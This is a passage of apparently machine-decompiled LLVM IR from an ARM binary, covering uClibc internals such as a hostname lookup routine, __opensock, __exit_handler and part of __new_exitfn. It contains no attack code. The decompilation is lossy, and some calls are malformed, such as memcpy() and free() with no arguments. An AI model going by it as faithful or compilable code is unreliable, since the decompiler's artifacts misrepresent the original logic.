  br i1 %v7_30320, label %dec_label_pc_30328, label %dec_label_pc_3055c

dec_label_pc_30328:                               ; preds = %dec_label_pc_3031c, %dec_label_pc_302f4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_30330

dec_label_pc_30330:                               ; preds = %.thread4, %bb36, %dec_label_pc_30328
  %storemerge2 = phi i32 [ 0, %dec_label_pc_30328 ], [ 0, %bb36 ], [ 1, %.thread4 ]
  store i32 %tmp19, i32* @ip, align 4
  store i32 -1, i32* @r3, align 4
  %v0_30338 = load i32, i32* @r8, align 4
  %v1_30338 = load i32, i32* @r4, align 4
  %v2_30338 = inttoptr i32 %v1_30338 to i32*
  store i32 %v0_30338, i32* %v2_30338, align 4
  %v0_3033c = load i32, i32* @sl, align 4
  %v1_3033c = inttoptr i32 %v0_3033c to i8*
  store i32 %v0_3033c, i32* %r0.global-to-local, align 4
  %v0_30340 = load i32, i32* @r3, align 4
  %v1_30340 = load i32, i32* @ip, align 4
  %v2_30340 = inttoptr i32 %v1_30340 to i32*
  store i32 %v0_30340, i32* %v2_30340, align 4
  %v3_30344 = call i32 @strlen(i8* %v1_3033c)
  store i32 %v3_30344, i32* %r0.global-to-local, align 4
  %v1_30348 = add i32 %v3_30344, 1
  store i32 %v1_30348, i32* @r4, align 4
  %v0_3034c = load i32, i32* @r6, align 4
  %v7_30350 = icmp sgt i32 %v0_3034c, %v1_30348
  br i1 %v7_30350, label %dec_label_pc_30354, label %dec_label_pc_30558

dec_label_pc_30354:                               ; preds = %dec_label_pc_30330
  %v0_30354 = load i32, i32* @sl, align 4
  store i32 %v0_30354, i32* @r1, align 4
  store i32 %v1_30348, i32* @r2, align 4
  store i32 %v0_3027c, i32* @r0, align 4
  %v0_30360 = call i32 @memcpy()
  store i32 %v0_30360, i32* %r0.global-to-local, align 4
  %v1_30368 = load i32, i32* @r4, align 4
  %v2_30368 = add i32 %v1_30368, %v0_3027c
  %v1_3036c = sub i32 0, %v2_30368
  %v1_30370 = load i32, i32* @r6, align 4
  %v2_30370 = sub i32 %v1_30370, %v1_30368
  store i32 %v2_30370, i32* %r2.global-to-local, align 4
  %v1_30374 = urem i32 %v1_3036c, 4
  store i32 %v1_30374, i32* %r3.global-to-local, align 4
  %v2_30378 = sub i32 %v2_30370, %v1_30374
  store i32 %v2_30378, i32* @sb, align 4
  %v1_3037c = add i32 %v2_30378, -8
  store i32 %v1_3037c, i32* @r5, align 4
  %v7_30384 = icmp slt i32 %v1_3037c, 256
  br i1 %v7_30384, label %dec_label_pc_30558, label %dec_label_pc_30388

dec_label_pc_30388:                               ; preds = %dec_label_pc_30354
  %v2_30388 = add i32 %v1_30374, %v2_30368
  store i32 %v2_30388, i32* @fp, align 4
  store i32 %v0_3027c, i32* %ip.global-to-local, align 4
  %v1_30390 = add i32 %v2_30388, 8
  store i32 %v1_30390, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_30398 = add i32 %v2_30388, 16
  store i32 %v1_30398, i32* @r8, align 4
  %v4_3039c = inttoptr i32 %v2_30388 to i32*
  store i32 %v0_3027c, i32* %v4_3039c, align 4
  %v0_303a0 = load i32, i32* @sl, align 4
  %v1_303a0 = inttoptr i32 %v0_303a0 to i8*
  store i32 %v0_303a0, i32* %r0.global-to-local, align 4
  %v0_303a4 = load i32, i32* @r4, align 4
  %v1_303a4 = load i32, i32* @fp, align 4
  %v2_303a4 = add i32 %v1_303a4, 4
  %v3_303a4 = inttoptr i32 %v2_303a4 to i32*
  store i32 %v0_303a4, i32* %v3_303a4, align 4
  %v0_303a8 = load i32, i32* @r8, align 4
  %v4_303ac = call i32 @inet_aton(i8* %v1_303a0, i32 %v0_303a8)
  store i32 %v4_303ac, i32* %r0.global-to-local, align 4
  %v1_303b0 = load i32, i32* @r4, align 4
  %v9_303b0 = icmp eq i32 %v4_303ac, %v1_303b0
  br i1 %v9_303b0, label %dec_label_pc_303f4, label %dec_label_pc_303b8

dec_label_pc_303b8:                               ; preds = %dec_label_pc_30388
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_303bc = load i32, i32* @r7, align 4
  %v2_303bc = add i32 %v1_303bc, 8
  %v3_303bc = inttoptr i32 %v2_303bc to i32*
  store i32 2, i32* %v3_303bc, align 4
  %v0_303c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_303c0 = mul i32 %v0_303c0, 2
  %v1_303c4 = load i32, i32* @r7, align 4
  %v2_303c4 = add i32 %v1_303c4, 12
  %v3_303c4 = inttoptr i32 %v2_303c4 to i32*
  store i32 %v2_303c0, i32* %v3_303c4, align 4
  %v3_303c8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_303c8, i32* %r2.global-to-local, align 4
  store i32 %v0_3027c, i32* %r3.global-to-local, align 4
  store i32 %tmp19, i32* @ip, align 4
  %v0_303d4 = load i32, i32* @r4, align 4
  store i32 %v0_303d4, i32* @r5, align 4
  %v0_303d8 = load i32, i32* @r8, align 4
  %v1_303d8 = load i32, i32* @fp, align 4
  %v2_303d8 = add i32 %v1_303d8, 8
  %v3_303d8 = inttoptr i32 %v2_303d8 to i32*
  store i32 %v0_303d8, i32* %v3_303d8, align 4
  %v0_303dc = load i32, i32* @r7, align 4
  %v1_303dc = load i32, i32* %r2.global-to-local, align 4
  %v2_303dc = inttoptr i32 %v1_303dc to i32*
  store i32 %v0_303dc, i32* %v2_303dc, align 4
  %v0_303e0 = load i32, i32* @r7, align 4
  %v1_303e0 = inttoptr i32 %v0_303e0 to i32*
  %v2_303e0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_303e0, i32* %v1_303e0, align 4
  %v3_303e0 = add i32 %v0_303e0, 4
  %v4_303e0 = inttoptr i32 %v3_303e0 to i32*
  %v5_303e0 = load i32, i32* @fp, align 4
  store i32 %v5_303e0, i32* %v4_303e0, align 4
  %v0_303e4 = load i32, i32* @r6, align 4
  %v1_303e4 = load i32, i32* @r7, align 4
  %v2_303e4 = add i32 %v1_303e4, 16
  %v3_303e4 = inttoptr i32 %v2_303e4 to i32*
  store i32 %v0_303e4, i32* %v3_303e4, align 4
  %v0_303e8 = load i32, i32* @r4, align 4
  %v1_303e8 = load i32, i32* @ip, align 4
  %v2_303e8 = inttoptr i32 %v1_303e8 to i32*
  store i32 %v0_303e8, i32* %v2_303e8, align 4
  %v0_303ec = load i32, i32* @r4, align 4
  %v1_303ec = load i32, i32* @r6, align 4
  %v2_303ec = add i32 %v1_303ec, 4
  %v3_303ec = inttoptr i32 %v2_303ec to i32*
  store i32 %v0_303ec, i32* %v3_303ec, align 4
  br label %dec_label_pc_3055c

dec_label_pc_303f4:                               ; preds = %dec_label_pc_30388
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_303f8 = icmp eq i32 %storemerge2, 0
  br i1 %v2_303f8, label %dec_label_pc_30410, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_303f4
  store i32 %tmp19, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_302e8, align 4
  br label %dec_label_pc_3055c

dec_label_pc_30410:                               ; preds = %dec_label_pc_303f4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_3041c = load i32, i32* @sl, align 4
  %v1_3041c = inttoptr i32 %v0_3041c to i8*
  store i32 %v0_3041c, i32* %r0.global-to-local, align 4
  %v2_30424 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_30424, i32* %r2.global-to-local, align 4
  %v2_30428 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_30428, i32* %r3.global-to-local, align 4
  %v9_30434 = call i32 @__dns_lookup(i8* %v1_3041c, i32 1, i32 %v2_30424, i32 %v2_30428)
  store i32 %v9_30434, i32* %r0.global-to-local, align 4
  %v1_30438 = icmp slt i32 %v9_30434, 0
  br i1 %v1_30438, label %.thread, label %dec_label_pc_30450

.thread:                                          ; preds = %dec_label_pc_30410
  store i32 %tmp19, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_302e8, align 4
  br label %dec_label_pc_3055c

dec_label_pc_30450:                               ; preds = %dec_label_pc_30410
  store i32 %tmp13, i32* %r3.global-to-local, align 4
  %v7_30454 = icmp eq i32 %tmp13, 1
  br i1 %v7_30454, label %dec_label_pc_3045c, label %dec_label_pc_30534

dec_label_pc_3045c:                               ; preds = %dec_label_pc_30450
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_30474 = load i32, i32* @r5, align 4
  %v2_30474 = add i32 %v0_30474, -12
  store i32 %v2_30474, i32* @r8, align 4
  %v8_30474 = icmp slt i32 %v2_30474, 0
  br i1 %v8_30474, label %bb38, label %dec_label_pc_30480

bb38:                                             ; preds = %dec_label_pc_3045c
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_30544

dec_label_pc_30480:                               ; preds = %dec_label_pc_3045c
  %v0_30480 = load i32, i32* @r6, align 4
  store i32 %v0_30480, i32* @r1, align 4
  %v2_30484 = add i32 %v0_30480, 12
  store i32 %v2_30484, i32* @r0, align 4
  %v2_30488 = call i32 @memmove(i32 %v2_30484, i32 %v0_30480)
  %v0_3048c = load i32, i32* @fp, align 4
  %v1_3048c = add i32 %v0_3048c, 4
  store i32 %v1_3048c, i32* @r3, align 4
  %v1_30490 = load i32, i32* @r4, align 4
  %v2_30490 = add i32 %v1_30490, %v1_3048c
  store i32 %v2_30490, i32* @r5, align 4
  store i32 %v2_30490, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_304a0 = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_304ac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_304ac

dec_label_pc_304ac:                               ; preds = %dec_label_pc_304ac, %dec_label_pc_30480
  %v0_304ac = phi i32 [ %v0_304ac.pre, %dec_label_pc_30480 ], [ %v1_304b0, %dec_label_pc_304ac ]
  %v1_304ac = load i32, i32* @r6, align 4
  %v7_304ac = inttoptr i32 %v1_304ac to i32*
  store i32 %v0_304ac, i32* %v7_304ac, align 4
  %v0_304b0 = load i32, i32* @r5, align 4
  %v1_304b0 = add i32 %v0_304b0, 4
  store i32 %v1_304b0, i32* @r5, align 4
  %v0_304b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_304b4 = add i32 %v0_304b4, 1
  store i32 %v1_304b4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp39 = icmp eq i32 %v1_304b4, 0
  br i1 %tmp39, label %dec_label_pc_304ac, label %dec_label_pc_304c4

dec_label_pc_304c4:                               ; preds = %dec_label_pc_304ac
  %v3_304c4 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_304c4, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_304cc = icmp eq i32 %v3_304c4, 0
  %v1_304d0 = load i32, i32* @r6, align 4
  %v5_304d0 = mul i32 %v1_304b4, 4
  %v6_304d0 = add i32 %v1_304d0, %v5_304d0
  %v7_304d0 = inttoptr i32 %v6_304d0 to i32*
  store i32 0, i32* %v7_304d0, align 4
  br i1 %v2_304cc, label %dec_label_pc_30500, label %dec_label_pc_304d8

dec_label_pc_304d8:                               ; preds = %dec_label_pc_304c4
  %v0_304d8 = load i32, i32* @r4, align 4
  %v1_304d8 = inttoptr i32 %v0_304d8 to i8*
  store i32 %v0_304d8, i32* %r0.global-to-local, align 4
  %v3_304dc = call i32 @strlen(i8* %v1_304d8)
  store i32 %v3_304dc, i32* %r0.global-to-local, align 4
  %v0_304e0 = load i32, i32* @r8, align 4
  %tmp43 = icmp ugt i32 %v0_304e0, %v3_304dc
  br i1 %tmp43, label %dec_label_pc_304e8, label %dec_label_pc_30500

dec_label_pc_304e8:                               ; preds = %dec_label_pc_304d8
  %v0_304e8 = load i32, i32* @r4, align 4
  store i32 %v0_304e8, i32* @r1, align 4
  %v0_304ec = load i32, i32* @r5, align 4
  store i32 %v0_304ec, i32* %r0.global-to-local, align 4
  %v2_304f0 = inttoptr i32 %v0_304ec to i8*
  %v3_304f0 = call i32 @strcpy(i8* %v2_304f0, i32 %v0_304e8)
  store i32 %v3_304f0, i32* %r0.global-to-local, align 4
  %v0_304f4 = load i32, i32* @r5, align 4
  br label %dec_label_pc_30500

dec_label_pc_30500:                               ; preds = %dec_label_pc_304d8, %dec_label_pc_304c4, %dec_label_pc_304e8
  %storemerge1 = phi i32 [ %v0_304f4, %dec_label_pc_304e8 ], [ %v0_3027c, %dec_label_pc_304d8 ], [ %v0_3027c, %dec_label_pc_304c4 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_30504 = load i32, i32* @r7, align 4
  %v2_30504 = add i32 %v1_30504, 8
  %v3_30504 = inttoptr i32 %v2_30504 to i32*
  store i32 2, i32* %v3_30504, align 4
  %v0_30508 = load i32, i32* %r2.global-to-local, align 4
  %v2_30508 = mul i32 %v0_30508, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_30510 = load i32, i32* @r7, align 4
  %v2_30510 = add i32 %v1_30510, 12
  %v3_30510 = inttoptr i32 %v2_30510 to i32*
  store i32 %v2_30508, i32* %v3_30510, align 4
  %v3_30514 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_30514, i32* @ip, align 4
  store i32 %tmp19, i32* %r2.global-to-local, align 4
  %v0_3051c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_3051c, i32* @r5, align 4
  %v0_30520 = load i32, i32* @r7, align 4
  %v2_30520 = inttoptr i32 %v3_30514 to i32*
  store i32 %v0_30520, i32* %v2_30520, align 4
  %v0_30524 = load i32, i32* @r7, align 4
  %v1_30524 = inttoptr i32 %v0_30524 to i32*
  %v2_30524 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_30524, i32* %v1_30524, align 4
  %v3_30524 = add i32 %v0_30524, 4
  %v4_30524 = inttoptr i32 %v3_30524 to i32*
  %v5_30524 = load i32, i32* @fp, align 4
  store i32 %v5_30524, i32* %v4_30524, align 4
  %v0_30528 = load i32, i32* @r6, align 4
  %v1_30528 = load i32, i32* @r7, align 4
  %v2_30528 = add i32 %v1_30528, 16
  %v3_30528 = inttoptr i32 %v2_30528 to i32*
  store i32 %v0_30528, i32* %v3_30528, align 4
  %v0_3052c = load i32, i32* %r3.global-to-local, align 4
  %v1_3052c = load i32, i32* %r2.global-to-local, align 4
  %v2_3052c = inttoptr i32 %v1_3052c to i32*
  store i32 %v0_3052c, i32* %v2_3052c, align 4
  br label %dec_label_pc_30544

dec_label_pc_30534:                               ; preds = %dec_label_pc_30450
  store i32 %tmp19, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_302e8, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_30544

dec_label_pc_30544:                               ; preds = %bb38, %dec_label_pc_30500, %dec_label_pc_30534
  %v3_30544 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_30544, i32* @r0, align 4
  %v0_30548 = call i32 @free()
  %v3_3054c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_3054c, i32* @r0, align 4
  %v0_30550 = call i32 @free()
  store i32 %v0_30550, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_3055c

dec_label_pc_30558:                               ; preds = %dec_label_pc_30330, %dec_label_pc_30354
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_3055c

dec_label_pc_3055c:                               ; preds = %.thread, %bb, %bb35, %.thread7, %dec_label_pc_3031c, %dec_label_pc_302fc, %dec_label_pc_30544, %dec_label_pc_303b8, %dec_label_pc_30558
  %v0_3055c = load i32, i32* @r5, align 4
  store i32 %v0_3055c, i32* %r0.global-to-local, align 4
  store i32 %v3_30274, i32* @r4, align 4
  store i32 %v9_30274, i32* @r6, align 4
  store i32 %v12_30274, i32* @r7, align 4
  store i32 %v15_30274, i32* @r8, align 4
  store i32 %v18_30274, i32* @sb, align 4
  store i32 %v21_30274, i32* @sl, align 4
  store i32 %v24_30274, i32* @fp, align 4
  ret i32 %v0_3055c

; uselistorder directives
  uselistorder i32 %v0_304d8, { 1, 0 }
  uselistorder i32 %v1_304b4, { 1, 0, 2 }
  uselistorder i32 %v1_304b0, { 1, 0 }
  uselistorder i32 %v0_30480, { 1, 0, 2 }
  uselistorder i32 %v2_30474, { 1, 0 }
  uselistorder i32 %v0_3041c, { 1, 0 }
  uselistorder i32 %v0_303a0, { 1, 0 }
  uselistorder i32 %v1_30374, { 2, 1, 0 }
  uselistorder i32 %v1_30368, { 1, 0 }
  uselistorder i32 %v0_3033c, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_302e8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_3027c, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp19, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp13, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 19, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 1, 2, 6, 5, 8, 7, 9, 20, 21, 11, 10, 13, 12, 14, 16, 15, 18, 17, 19, 0 }
  uselistorder i32 (i8*, i32, i32, i32)* @__dns_lookup, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @inet_aton, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_3055c, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_30558, { 1, 0 }
  uselistorder label %dec_label_pc_30544, { 2, 1, 0 }
  uselistorder label %dec_label_pc_30500, { 2, 0, 1 }
  uselistorder label %dec_label_pc_30330, { 2, 0, 1 }
}

define i32 @__opensock() local_unnamed_addr {
entry:
  %v3_30580 = call i32 @socket(i32 10, i32 2, i32 0)
  %v1_30584 = icmp slt i32 %v3_30580, 0
  br i1 %v1_30584, label %bb, label %bb5

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %storemerge = phi i32 [ 2, %bb ], [ %v3_30580, %entry ]
  call void @__pseudo_cond_branch(i1 %v1_30584, i32 ptrtoint (i32* @global_var_28798.2083 to i32))
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__exit_handler(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 55976, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_daac.2087 to i32), i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  br label %dec_label_pc_3061c

dec_label_pc_305c4:                               ; preds = %dec_label_pc_3061c
  store i32 %v4_30634, i32* %r3.global-to-local, align 4
  %v2_305c8 = add i32 %v4_30634, %v3_30628
  %v3_305c8 = inttoptr i32 %v2_305c8 to i32*
  %v4_305c8 = load i32, i32* %v3_305c8, align 4
  store i32 %v4_305c8, i32* %r2.global-to-local, align 4
  %v7_305cc = icmp eq i32 %v4_305c8, 2
  store i32 %v1_30620, i32* %v3_3061c, align 4
  %v0_305d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_305d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_305d4 = add i32 %v1_305d4, %v0_305d4
  store i32 %v2_305d4, i32* %r3.global-to-local, align 4
  br i1 %v7_305cc, label %dec_label_pc_305e8, label %dec_label_pc_305dc

dec_label_pc_305dc:                               ; preds = %dec_label_pc_305c4
  %v0_305dc = load i32, i32* %r2.global-to-local, align 4
  %v7_305dc = icmp eq i32 %v0_305dc, 3
  br i1 %v7_305dc, label %dec_label_pc_30608, label %dec_label_pc_3061c.backedge

dec_label_pc_305e8:                               ; preds = %dec_label_pc_305c4
  %v1_305e8 = add i32 %v2_305d4, 4
  %v2_305e8 = inttoptr i32 %v1_305e8 to i32*
  %v3_305e8 = load i32, i32* %v2_305e8, align 4
  store i32 %v3_305e8, i32* %r2.global-to-local, align 4
  %v2_305ec = icmp eq i32 %v3_305e8, 0
  %v0_305f0 = load i32, i32* @r5, align 4
  store i32 %v0_305f0, i32* %r0.global-to-local, align 4
  br i1 %v2_305ec, label %dec_label_pc_3061c.backedge, label %dec_label_pc_305f8

dec_label_pc_305f8:                               ; preds = %dec_label_pc_305e8
  store i32 198148, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_305e8)
  br label %dec_label_pc_3061c.backedge

dec_label_pc_30608:                               ; preds = %dec_label_pc_305dc
  %v1_30608 = add i32 %v2_305d4, 4
  %v2_30608 = inttoptr i32 %v1_30608 to i32*
  %v3_30608 = load i32, i32* %v2_30608, align 4
  store i32 %v3_30608, i32* %r2.global-to-local, align 4
  %v2_3060c = icmp eq i32 %v3_30608, 0
  br i1 %v2_3060c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_30608
  %v2_30610 = add i32 %v2_305d4, 8
  %v3_30610 = inttoptr i32 %v2_30610 to i32*
  %v4_30610 = load i32, i32* %v3_30610, align 4
  store i32 %v4_30610, i32* %r0.global-to-local, align 4
  store i32 198172, i32* @lr, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_30608, %bb
  %v2_30618 = xor i1 %v2_3060c, true
  call void @__pseudo_cond_branch(i1 %v2_30618, i32 %v3_30608)
  br label %dec_label_pc_3061c.backedge

dec_label_pc_3061c.backedge:                      ; preds = %.thread, %dec_label_pc_305f8, %dec_label_pc_305e8, %dec_label_pc_305dc
  %v0_3061c.pre = load i32, i32* @r4, align 4
  %v1_3061c.pre = load i32, i32* @r6, align 4
  %v0_3062c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_3061c

dec_label_pc_3061c:                               ; preds = %dec_label_pc_3061c.backedge, %entry
  %v1_30634 = phi i32 [ %v0_3062c.pre, %dec_label_pc_3061c.backedge ], [ ptrtoint (i32* @global_var_daac.2087 to i32), %entry ]
  %v2_305d0 = phi i32 [ %v1_3061c.pre, %dec_label_pc_3061c.backedge ], [ 55976, %entry ]
  %v1_305d0 = phi i32 [ %v0_3061c.pre, %dec_label_pc_3061c.backedge ], [ ptrtoint (i32* @global_var_44990.1184 to i32), %entry ]
  %v2_3061c = add i32 %v1_305d0, %v2_305d0
  %v3_3061c = inttoptr i32 %v2_3061c to i32*
  %v4_3061c = load i32, i32* %v3_3061c, align 4
  %v1_30620 = add i32 %v4_3061c, -1
  %v2_30624 = icmp eq i32 %v4_3061c, 0
  %v3_30628 = mul i32 %v1_30620, 16
  store i32 %v3_30628, i32* %r0.global-to-local, align 4
  store i32 %v1_30634, i32* %r3.global-to-local, align 4
  %v2_30634 = add i32 %v1_305d0, %v1_30634
  %v3_30634 = inttoptr i32 %v2_30634 to i32*
  %v4_30634 = load i32, i32* %v3_30634, align 4
  br i1 %v2_30624, label %dec_label_pc_30634, label %dec_label_pc_305c4

dec_label_pc_30634:                               ; preds = %dec_label_pc_3061c
  store i32 %v4_30634, i32* @r0, align 4
  %v0_30638 = call i32 @free()
  store i32 %v0_30638, i32* %r0.global-to-local, align 4
  ret i32 %v0_30638

; uselistorder directives
  uselistorder i32 %v4_30634, { 2, 0, 1 }
  uselistorder i32* %v3_3061c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__new_exitfn() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_30654 = load i32, i32* @r4, align 4
  store i32 %v3_30654, i32* %stack_var_-20, align 4
  %v6_30654 = load i32, i32* @r5, align 4
  %v15_30654 = load i32, i32* @lr, align 4
  store i32 208, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  %v4_30664 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 208) to i32*), align 4
  store i32 %v4_30664, i32* @r4, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_3066c = ptrtoint i32* %stack_var_-40 to i32
  %v4_30670 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 96) to i32*), align 4
  store i32 %v4_30670, i32* %r1.global-to-local, align 4
  store i32 %v4_30664, i32* %r2.global-to-local, align 4
  store i32 %v2_3066c, i32* %r0.global-to-local, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  %v4_30680 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  store i32 %v4_30680, i32* %ip.global-to-local, align 4
  store i32 198284, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_30680)
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_30690 = load i32, i32* @r4, align 4
  store i32 %v0_30690, i32* %r0.global-to-local, align 4
  %v0_30694 = load i32, i32* @r5, align 4
  %v2_30694 = add i32 %v0_30694, 36
  %v3_30694 = inttoptr i32 %v2_30694 to i32*
  %v4_30694 = load i32, i32* %v3_30694, align 4
  store i32 %v4_30694, i32* %ip.global-to-local, align 4
  store i32 198304, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_30694)
  store i32 55976, i32* %r3.global-to-local, align 4
  store i32 55984, i32* @r6, align 4
  %v0_306a8 = load i32, i32* @r5, align 4
  %v2_306a8 = add i32 %v0_306a8, 55976
  %v3_306a8 = inttoptr i32 %v2_306a8 to i32*
  %v4_306a8 = load i32, i32* %v3_306a8, align 4
  store i32 %v4_306a8, i32* %r3.global-to-local, align 4
  %v2_306ac = add i32 %v0_306a8, 55984
  %v3_306ac = inttoptr i32 %v2_306ac to i32*
  %v4_306ac = load i32, i32* %v3_306ac, align 4
  store i32 %v4_306ac, i32* %r1.global-to-local, align 4
  %v1_306b0 = add i32 %v4_306a8, 1
  store i32 %v1_306b0, i32* %r3.global-to-local, align 4
  %v6_306b8 = icmp slt i32 %v4_306ac, %v1_306b0
  br i1 %v6_306b8, label %dec_label_pc_306bc, label %dec_label_pc_306f8

dec_label_pc_306bc:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_daac.2087 to i32), i32* @r7, align 4
  %v3_306c0 = mul i32 %v4_306ac, 16
  %v1_306c4 = add i32 %v3_306c0, 320
  store i32 %v1_306c4, i32* %r1.global-to-local, align 4
  %v2_306c8 = add i32 %v0_306a8, ptrtoint (i32* @global_var_daac.2087 to i32)
  %v3_306c8 = inttoptr i32 %v2_306c8 to i32*
  %v4_306c8 = load i32, i32* %v3_306c8, align 4
  store i32 %v4_306c8, i32* %r0.global-to-local, align 4
  %v2_306cc = inttoptr i32 %v4_306c8 to i32*
  %v3_306cc = call i32 @realloc(i32* %v2_306cc, i32 %v1_306c4)
  store i32 %v3_306cc, i32* %r0.global-to-local, align 4
  store i32 %v3_306cc, i32* %r4.global-to-local, align 4
  %v2_306d0 = icmp eq i32 %v3_306cc, 0
  br i1 %v2_306d0, label %dec_label_pc_306d8, label %dec_label_pc_306e8

dec_label_pc_306d8:                               ; preds = %dec_label_pc_306bc
  %v0_306d8 = call i32 @__GI___errno_location()
  store i32 %v0_306d8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_306e0 = inttoptr i32 %v0_306d8 to i32*
  store i32 12, i32* %v2_306e0, align 4
  br label %dec_label_pc_30730

dec_label_pc_306e8:                               ; preds = %dec_label_pc_306bc
  %v0_306e8 = load i32, i32* @r5, align 4
  %v1_306e8 = load i32, i32* @r6, align 4
  %v2_306e8 = add i32 %v1_306e8, %v0_306e8
  %v3_306e8 = inttoptr i32 %v2_306e8 to i32*
  %v4_306e8 = load i32, i32* %v3_306e8, align 4
  %v1_306ec = add i32 %v4_306e8, 20
  store i32 %v1_306ec, i32* %r3.global-to-local, align 4
  %v2_306f0 = load i32, i32* @r7, align 4
  %v3_306f0 = add i32 %v2_306f0, %v0_306e8
  %v4_306f0 = inttoptr i32 %v3_306f0 to i32*
  store i32 %v3_306cc, i32* %v4_306f0, align 4
  %v0_306f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_306f4 = load i32, i32* @r5, align 4
  %v2_306f4 = load i32, i32* @r6, align 4
  %v3_306f4 = add i32 %v2_306f4, %v1_306f4
  %v4_306f4 = inttoptr i32 %v3_306f4 to i32*
  store i32 %v0_306f4, i32* %v4_306f4, align 4
  %v0_30700.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_306f8

dec_label_pc_306f8:                               ; preds = %entry, %dec_label_pc_306e8
  %v0_30700 = phi i32 [ %v0_306a8, %entry ], [ %v0_30700.pre, %dec_label_pc_306e8 ]
  store i32 55976, i32* %lr.global-to-local, align 4
